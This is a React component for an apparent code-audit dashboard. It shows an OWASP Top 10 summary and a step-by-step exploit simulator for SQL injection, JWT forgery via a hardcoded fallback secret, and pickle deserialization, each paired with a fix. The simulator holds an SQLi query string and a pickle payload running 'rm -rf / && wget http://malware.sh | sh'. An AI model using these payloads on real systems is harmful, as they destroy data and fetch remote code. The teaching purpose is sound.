import React, { useState } from 'react';
import { 
  ShieldAlert, 
  ShieldCheck, 
  Lock, 
  Key, 
  Database, 
  Globe, 
  FileCheck, 
  AlertOctagon, 
  CheckCircle2, 
  AlertTriangle, 
  Play, 
  ArrowRight, 
  GitPullRequest, 
  Check, 
  Zap, 
  Terminal, 
  Bug,
  Sparkles
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { AnalysisResult } from '../types';
import PageHeader from '../components/common/PageHeader';
import Badge, { BadgeVariant } from '../components/common/Badge';
import Modal from '../components/common/Modal';
import CodeBlock from '../components/common/CodeBlock';

interface SecurityViewProps {
  analysis: AnalysisResult | null;
  onNavigateExplorer: (file: string, line: number) => void;
}

export default function SecurityView({ analysis, onNavigateExplorer }: SecurityViewProps) {
  const [activeSimulationStep, setActiveSimulationStep] = useState<number>(0);
  const [selectedExploitType, setSelectedExploitType] = useState<'sqli' | 'jwt' | 'pickle'>('sqli');
  const [showRemediationModal, setShowRemediationModal] = useState<boolean>(false);
  const [isPatched, setIsPatched] = useState<boolean>(false);

  if (!analysis) {
    return (
      <div className="p-10 text-center text-zinc-400 font-mono text-xs">
        No security analysis available. Please upload or select a project first.
      </div>
    );
  }

  const securityIssues = analysis.issues.filter((i) => i.category === 'security');

  const owaspCategories = [
    { title: 'A01: Broken Access Control', count: securityIssues.filter((i) => i.title.toLowerCase().includes('auth') || i.title.toLowerCase().includes('refund')).length || 1, status: 'warning' },
    { title: 'A02: Cryptographic Failures', count: securityIssues.filter((i) => i.title.toLowerCase().includes('secret') || i.title.toLowerCase().includes('jwt')).length || 1, status: 'critical' },
    { title: 'A03: Injection (SQL / Command)', count: securityIssues.filter((i) => i.title.toLowerCase().includes('sql')).length || 1, status: 'critical' },
    { title: 'A04: Insecure Design', count: 1, status: 'warning' },
    { title: 'A05: Security Misconfiguration (CORS)', count: securityIssues.filter((i) => i.title.toLowerCase().includes('cors')).length || 1, status: 'warning' },
    { title: 'A08: Software & Data Integrity Failures', count: securityIssues.filter((i) => i.title.toLowerCase().includes('pickle') || i.title.toLowerCase().includes('deserialization')).length || 1, status: 'critical' },
  ];

  const exploitSimulations = {
    sqli: {
      title: 'SQL Injection Payload Execution Flow',
      file: 'src/services/db.ts:18',
      payload: `GET /api/users?id=1'%20OR%20'1'='1'-- HTTP/1.1`,
      steps: [
        {
          step: 1,
          title: 'Malicious Request Ingress',
          desc: 'Attacker crafts HTTP query string with escaped single-quote SQL payload: id=1\' OR \'1\'=\'1\'--',
          code: `const sql = "SELECT * FROM users WHERE id = '" + req.query.id + "'";`,
        },
        {
          step: 2,
          title: 'String Concatenation Pollution',
          desc: 'Engine merges unescaped input string directly into SQL command buffer:',
          code: `SELECT * FROM users WHERE id = '1' OR '1'='1'--'`,
        },
        {
          step: 3,
          title: 'Database Query Exploit',
          desc: 'Database executes condition as always true, returning all user account rows including hash dumps.',
          code: `[Result: 10,000 User Records Exfiltrated]`,
        },
        {
          step: 4,
          title: 'Remediated Parameterized Block',
          desc: 'Parameterized query isolates input parameters safely in prepared statements:',
          code: `db.query("SELECT * FROM users WHERE id = $1", [req.query.id]);`,
        },
      ],
    },
    jwt: {
      title: 'JWT Hardcoded Key Forgery Sequence',
      file: 'src/routes/auth.ts:12',
      payload: `Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...`,
      steps: [
        {
          step: 1,
          title: 'Signature Verification Bypass',
          desc: 'Attacker inspects public source code repository and discovers fallback secret string "fallback-secret".',
          code: `jwt.sign(payload, process.env.JWT_SECRET || 'fallback-secret')`,
        },
        {
          step: 2,
          title: 'Off-Line Admin Token Generation',
          desc: 'Attacker signs a rogue token locally using the exposed secret string with admin claim.',
          code: `jwt.sign({ role: 'superadmin' }, 'fallback-secret')`,
        },
        {
          step: 3,
          title: 'Privilege Escalation',
          desc: 'Server approves forged signature and grants unauthorized administrative panel access.',
          code: `[HTTP 200 OK: Granted Admin Token]`,
        },
        {
          step: 4,
          title: 'Remediated Strict KMS Verification',
          desc: 'Strict error throwing when environment key is missing prevents fallback leaks:',
          code: `if (!process.env.JWT_SECRET) throw new Error("JWT_SECRET missing");`,
        },
      ],
    },
    pickle: {
      title: 'Python Pickle Remote Code Execution (RCE)',
      file: 'src/services/parser.py:42',
      payload: `POST /api/upload-model (Binary Pickle Payload)`,
      steps: [
        {
          step: 1,
          title: 'Malicious Object Injection',
          desc: 'Attacker constructs custom __reduce__ python pickle payload containing os.system shell commands.',
          code: `class Exploit(object):\n  def __reduce__(self):\n    return (os.system, ('rm -rf / && wget http://malware.sh | sh',))`,
        },
        {
          step: 2,
          title: 'Insecure Deserialization',
          desc: 'Server calls pickle.loads() on untrusted uploaded file bytes.',
          code: `data = pickle.loads(file_bytes)`,
        },
        {
          step: 3,
          title: 'Arbitrary Shell Command Execution',
          desc: 'Process executes system command with host daemon privileges.',
          code: `[Container Shell Breached: Root RCE]`,
        },
        {
          step: 4,
          title: 'Remediated Safe JSON/Protobuf Parsing',
          desc: 'Replaced arbitrary python object deserializer with strict JSON schema validator.',
          code: `data = json.loads(file_bytes.decode('utf-8'))`,
        },
      ],
    },
  };

  const currentSim = exploitSimulations[selectedExploitType];

  return (
    <div className="p-6 sm:p-8 max-w-7xl mx-auto space-y-7 select-none font-sans">
      {/* Header */}
      <PageHeader
        title="OWASP Security Vulnerability & Exploit Simulator"
        subtitle="Deep code audit for injection attacks, cryptographic defects, and privilege escalation vectors"
        icon={<ShieldCheck size={22} />}
        actions={
          <button
            onClick={() => setShowRemediationModal(true)}
            className="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 text-white font-semibold text-xs rounded-xl shadow-lg shadow-indigo-600/20 flex items-center space-x-2 transition-all cursor-pointer"
          >
            <Zap size={14} />
            <span>Remediation Roadmap</span>
          </button>
        }
      />

      {/* OWASP Top 10 Matrix */}
      <div className="bg-zinc-900/90 border border-zinc-800/90 rounded-2xl p-6 space-y-4 shadow-xl">
        <div className="flex items-center justify-between pb-3 border-b border-zinc-800">
          <div className="flex items-center space-x-2">
            <Lock size={16} className="text-indigo-400" />
            <h2 className="text-xs font-bold text-white uppercase tracking-wider font-mono">
              OWASP Top 10 (2025 Standard) Repository Coverage
            </h2>
          </div>
          <span className="text-[10px] text-zinc-400 font-mono">6 of 10 Evaluated</span>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3.5">
          {owaspCategories.map((cat, idx) => (
            <motion.div
              key={cat.title}
              initial={{ opacity: 0, y: 8 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.2, delay: idx * 0.04 }}
              className="p-3.5 rounded-xl bg-zinc-950/80 border border-zinc-800/80 flex items-center justify-between"
            >
              <div className="min-w-0 pr-2">
                <div className="text-xs font-semibold text-zinc-200 truncate">{cat.title}</div>
                <div className="text-[10px] text-zinc-500 font-mono mt-0.5">
                  {cat.count} findings identified
                </div>
              </div>

              <Badge variant={cat.status === 'critical' ? 'critical' : 'high'} size="xs">
                {cat.count > 0 ? `${cat.count} Risk` : 'Clean'}
              </Badge>
            </motion.div>
          ))}
        </div>
      </div>

      {/* Interactive Exploit Flow Simulator */}
      <div className="bg-zinc-900/90 border border-zinc-800/90 rounded-2xl p-6 space-y-6 shadow-xl">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-zinc-800">
          <div className="flex items-center space-x-2.5">
            <Bug size={18} className="text-rose-400" />
            <div>
              <h3 className="text-sm font-bold text-white">Interactive Attack Vector Step Simulator</h3>
              <p className="text-xs text-zinc-400">Step-by-step reproduction of discovered codebase exploits</p>
            </div>
          </div>

          <div className="flex items-center space-x-1.5 bg-zinc-950 p-1 rounded-xl border border-zinc-800 text-xs font-mono">
            {[
              { id: 'sqli', label: 'SQL Injection' },
              { id: 'jwt', label: 'JWT Forgery' },
              { id: 'pickle', label: 'Python RCE' },
            ].map((sim) => (
              <button
                key={sim.id}
                onClick={() => {
                  setSelectedExploitType(sim.id as any);
                  setActiveSimulationStep(0);
                }}
                className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer ${
                  selectedExploitType === sim.id
                    ? 'bg-indigo-600 text-white font-semibold shadow-sm'
                    : 'text-zinc-400 hover:text-white'
                }`}
              >
                {sim.label}
              </button>
            ))}
          </div>
        </div>

        {/* Step Progression Bar */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
          {currentSim.steps.map((step, idx) => (
            <button
              key={idx}
              onClick={() => setActiveSimulationStep(idx)}
              className={`p-3 rounded-xl border text-left transition-all cursor-pointer ${
                activeSimulationStep === idx
                  ? 'bg-indigo-600/20 border-indigo-500 text-white font-semibold'
                  : 'bg-zinc-950/80 border-zinc-800/80 text-zinc-400 hover:text-zinc-200'
              }`}
            >
              <div className="text-[10px] font-mono uppercase tracking-wider text-indigo-400">
                Step 0{step.step}
              </div>
              <div className="text-xs truncate font-medium mt-0.5">{step.title}</div>
            </button>
          ))}
        </div>

        {/* Current Active Step Box */}
        <div className="p-5 rounded-xl bg-zinc-950/90 border border-zinc-800 space-y-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-2">
              <Badge variant="critical" size="xs">
                Step {activeSimulationStep + 1} of 4
              </Badge>
              <span className="font-semibold text-white text-xs">
                {currentSim.steps[activeSimulationStep].title}
              </span>
            </div>
            <span className="text-[11px] font-mono text-zinc-400">{currentSim.file}</span>
          </div>

          <p className="text-xs text-zinc-300 leading-relaxed font-sans">
            {currentSim.steps[activeSimulationStep].desc}
          </p>

          <CodeBlock
            code={currentSim.steps[activeSimulationStep].code}
            language="typescript"
            showLineNumbers={false}
          />
        </div>
      </div>

      {/* Remediation Modal */}
      <Modal
        isOpen={showRemediationModal}
        onClose={() => setShowRemediationModal(false)}
        title="Automated Security Remediation Plan"
        subtitle="One-click security fixes verified against OWASP Top 10 and CWE standards"
        maxWidth="2xl"
      >
        <div className="space-y-4 text-xs font-sans">
          <div className="p-3.5 rounded-xl bg-emerald-950/20 border border-emerald-500/30 text-emerald-300">
            Applying this patch will isolate SQL query parameters and enforce cryptographically strict KMS secrets.
          </div>

          <div className="space-y-2">
            <div className="text-[11px] font-bold text-zinc-400 uppercase font-mono">Affected Files (2)</div>
            <div className="p-2.5 rounded-xl bg-zinc-950 border border-zinc-800 font-mono text-zinc-300 space-y-1">
              <div>• src/services/db.ts (Parameterized SQL Queries)</div>
              <div>• src/routes/auth.ts (Strict KMS Verification)</div>
            </div>
          </div>

          <div className="pt-2 flex items-center justify-end space-x-3">
            <button
              onClick={() => setShowRemediationModal(false)}
              className="px-4 py-2 rounded-xl bg-zinc-800 hover:bg-zinc-700 text-zinc-300 font-medium cursor-pointer"
            >
              Cancel
            </button>
            <button
              onClick={() => {
                setIsPatched(true);
                setShowRemediationModal(false);
              }}
              className="px-4 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-semibold flex items-center space-x-1.5 cursor-pointer shadow-md"
            >
              <Check size={14} />
              <span>Apply Security Fixes</span>
            </button>
          </div>
        </div>
      </Modal>
    </div>
  );
}
